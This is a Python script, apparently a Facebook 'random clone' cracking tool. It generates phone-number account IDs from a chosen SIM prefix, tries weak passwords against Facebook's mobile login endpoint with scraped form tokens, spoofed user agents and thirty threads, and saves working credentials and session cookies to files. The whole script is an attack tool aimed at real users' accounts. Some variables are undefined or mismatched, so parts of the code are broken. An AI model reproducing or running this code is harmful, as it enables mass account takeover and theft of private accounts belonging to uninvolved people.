

#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo= """
 █████╗     ████████╗    ██╗    ██╗  ██╗
██╔══██╗    ╚══██╔══╝    ██║    ██║ ██╔╝
███████║       ██║       ██║    █████╔╝ 
██╔══██║       ██║       ██║    ██╔═██╗ 
██║  ██║       ██║       ██║    ██║  ██╗
╚═╝  ╚═╝       ╚═╝       ╚═╝    ╚═╝  ╚═╝                                                                                                                                                                                                                                                                                                                       
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m ATIK ON
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MR ATIK
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m ATIK ON
\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mUNKNOWN
\033[1;36m =[TOOLS ]=     \033[1;36m\033[1;36mRANDOM -  \033[1;36m(V~0.1)
\033[1;36m═════════════════════════════════════════════════════════════
"""
linex=('\033[1;36m═════════════════════════════════════════════════════════════')
def naima():
	print('-------------------')
#_____________Def Main______________ 
def Main():
        os.system("clear")
        print(logo)
        print('\033[1;36m=[\033[1;36m1\033[1;36m]= START RANDOM CLONE')
        print('\033[1;36m=[\033[1;36m0\033[1;36m]= EXIT')
        Shorif =input("\033[1;36m=[\033[1;36m??\033[1;36m]= CHOOSE : ")
        if Sumaiya in ["1","01"]:
            fuck()
        if Sumaiya in [" 0", "00"]:
            exit()
        else:
            exit()
#______________Def Sc__________            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[×] Exm: 019, 016, 017, 018, 014, 014')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[×] Exm: 2000 3000 5000 10000 ')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;36m =[~]= SIM CODE     : '+kode)
        print(f'\033[1;36m =[~]= TOTAL ID     : '+tl)
        print(f'\033[1;36m =[~]= \033[1;36mUSE JAPAN VPN FOR GOOD RESULT')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(hasan,uid,pwx,tl)
    print('-------------------')
    print(' [✓] crack process has been completed')
    print(' [✓] OK Ids saved as Hasan-OK.txt')
    print(' [✓] CP Id Save as Hasan-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92m[ATIK-M1]\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',           
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'dpr': '2',
            'referer': 'https://p.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"CPH2269"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"[ATIK-OK🤙] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/ATIK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[ATIK-CP] {cid}|{ps}")
                open('/sdcard/ATIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
